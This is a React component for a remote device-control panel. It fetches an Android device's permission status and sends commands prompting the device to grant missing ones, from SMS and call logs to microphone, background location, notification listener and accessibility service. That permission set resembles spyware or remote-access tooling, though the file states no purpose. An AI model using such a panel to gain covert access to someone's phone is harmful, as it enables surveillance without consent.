import React, { useState, useCallback } from 'react';

const PERMISSION_LABELS = {
  'android.permission.CAMERA':                              'Camera',
  'android.permission.RECORD_AUDIO':                       'Microphone / Record Audio',
  'android.permission.ACCESS_FINE_LOCATION':               'Fine Location (GPS)',
  'android.permission.ACCESS_COARSE_LOCATION':             'Coarse Location (Network)',
  'android.permission.ACCESS_BACKGROUND_LOCATION':         'Background Location',
  'android.permission.READ_CONTACTS':                      'Read Contacts',
  'android.permission.READ_SMS':                           'Read SMS',
  'android.permission.SEND_SMS':                           'Send SMS',
  'android.permission.RECEIVE_SMS':                        'Receive SMS',
  'android.permission.READ_CALL_LOG':                      'Read Call Logs',
  'android.permission.READ_EXTERNAL_STORAGE':              'Read External Storage',
  'android.permission.WRITE_EXTERNAL_STORAGE':             'Write External Storage',
  'android.permission.READ_MEDIA_IMAGES':                  'Read Media Images',
  'android.permission.READ_MEDIA_VIDEO':                   'Read Media Video',
  'android.permission.READ_MEDIA_AUDIO':                   'Read Media Audio',
  'android.permission.ACCESS_WIFI_STATE':                  'Access WiFi State',
  'android.permission.CHANGE_WIFI_STATE':                  'Change WiFi State',
  'android.permission.VIBRATE':                            'Vibrate',
  'android.permission.WAKE_LOCK':                          'Wake Lock',
  'android.permission.RECEIVE_BOOT_COMPLETED':             'Receive Boot Completed',
  'android.permission.INTERNET':                           'Internet',
  'android.permission.ACCESS_NETWORK_STATE':               'Access Network State',
  'android.permission.FOREGROUND_SERVICE':                 'Foreground Service',
  'android.permission.POST_NOTIFICATIONS':                 'Post Notifications (Android 13+)',
  'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE': 'Notification Listener',
  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS': 'Ignore Battery Optimizations',
  'android.permission.SYSTEM_ALERT_WINDOW':                'Display Over Other Apps (Overlay)',
  'android.permission.BIND_ACCESSIBILITY_SERVICE':         'Accessibility Service',
};

export default function PermissionsTab({ device, sendCommand, results }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [permData, setPermData]     = useState(null);
  const [loading, setLoading]       = useState(false);
  const [requesting, setRequesting] = useState(null);
  const [status, setStatus]         = useState('');

  const parsePermissionsFromResults = useCallback((res) => {
    const match = res.find(r => r.command === 'get_permissions' && r.success);
    if (!match) return null;
    try {
      const parsed = typeof match.response === 'string' ? JSON.parse(match.response) : match.response;
      return parsed;
    } catch {
      return null;
    }
  }, []);

  const handleFetchPermissions = () => {
    setLoading(true);
    setStatus('Fetching permissions from device…');
    sendCommand(deviceId, 'get_permissions');
  };

  const handleRequestPermission = (permission) => {
    setRequesting(permission);
    setStatus(`Requesting: ${PERMISSION_LABELS[permission] || permission}`);
    sendCommand(deviceId, 'request_permission', { permission });
    setTimeout(() => {
      setRequesting(null);
      setStatus('Settings opened on device — user can grant the permission.');
    }, 2000);
  };

  const handleRequestAll = () => {
    setStatus('Opening app settings on device for all permissions…');
    sendCommand(deviceId, 'request_all_permissions');
    setTimeout(() => setStatus('App settings opened — user can grant all permissions.'), 2000);
  };

  const latestPerms = parsePermissionsFromResults(results);
  const displayData = latestPerms || permData;

  if (!loading && latestPerms && permData !== latestPerms) {
    setPermData(latestPerms);
    setLoading(false);
    setStatus('');
  }

  const granted    = displayData?.granted    || [];
  const notGranted = displayData?.notGranted || [];

  return (
    <div className="permissions-tab">
      <div className="perm-header">
        <div>
          <h3 style={{ margin: 0, color: '#a78bfa', fontSize: 16 }}>App Permissions</h3>
          <div style={{ fontSize: 12, color: '#64748b', marginTop: 2 }}>
            {displayData
              ? `${granted.length} granted · ${notGranted.length} not granted · ${granted.length + notGranted.length} total`
              : 'Fetch permissions to see current status on device'}
          </div>
        </div>
        <div style={{ display: 'flex', gap: 8 }}>
          <button
            className="perm-btn perm-btn-fetch"
            onClick={handleFetchPermissions}
            disabled={!isOnline || loading}
          >
            {loading ? '⏳ Fetching…' : '↻ Fetch Permissions'}
          </button>
          {displayData && notGranted.length > 0 && (
            <button
              className="perm-btn perm-btn-req-all"
              onClick={handleRequestAll}
              disabled={!isOnline}
            >
              ⚡ Request All Missing
            </button>
          )}
        </div>
      </div>

      {status && (
        <div className="perm-status-bar">
          {status}
        </div>
      )}

      {!displayData && !loading && (
        <div className="perm-empty">
          <div style={{ fontSize: 40 }}>🔐</div>
          <div style={{ marginTop: 12, fontSize: 14, color: '#94a3b8' }}>
            Press "Fetch Permissions" to see what permissions the device has granted or denied.
          </div>
        </div>
      )}

      {displayData && (
        <div className="perm-columns">
          <div className="perm-col">
            <div className="perm-col-header perm-col-granted">
              ✅ Granted ({granted.length})
            </div>
            <div className="perm-list">
              {granted.length === 0 && (
                <div className="perm-empty-col">No permissions granted</div>
              )}
              {granted.map((item) => (
                <div key={item.permission} className="perm-item perm-item-granted">
                  <div className="perm-item-icon">✅</div>
                  <div className="perm-item-info">
                    <div className="perm-item-label">{item.label || PERMISSION_LABELS[item.permission] || item.permission}</div>
                    <div className="perm-item-name">{item.permission}</div>
                  </div>
                  <div className="perm-item-badge granted">GRANTED</div>
                </div>
              ))}
            </div>
          </div>

          <div className="perm-col">
            <div className="perm-col-header perm-col-denied">
              ❌ Not Granted ({notGranted.length})
            </div>
            <div className="perm-list">
              {notGranted.length === 0 && (
                <div className="perm-empty-col">All permissions are granted!</div>
              )}
              {notGranted.map((item) => (
                <div key={item.permission} className="perm-item perm-item-denied">
                  <div className="perm-item-icon">❌</div>
                  <div className="perm-item-info">
                    <div className="perm-item-label">{item.label || PERMISSION_LABELS[item.permission] || item.permission}</div>
                    <div className="perm-item-name">{item.permission}</div>
                  </div>
                  <button
                    className="perm-request-btn"
                    onClick={() => handleRequestPermission(item.permission)}
                    disabled={!isOnline || requesting === item.permission}
                    title="Open settings on device for this permission"
                  >
                    {requesting === item.permission ? '⏳' : '⚡ Request'}
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
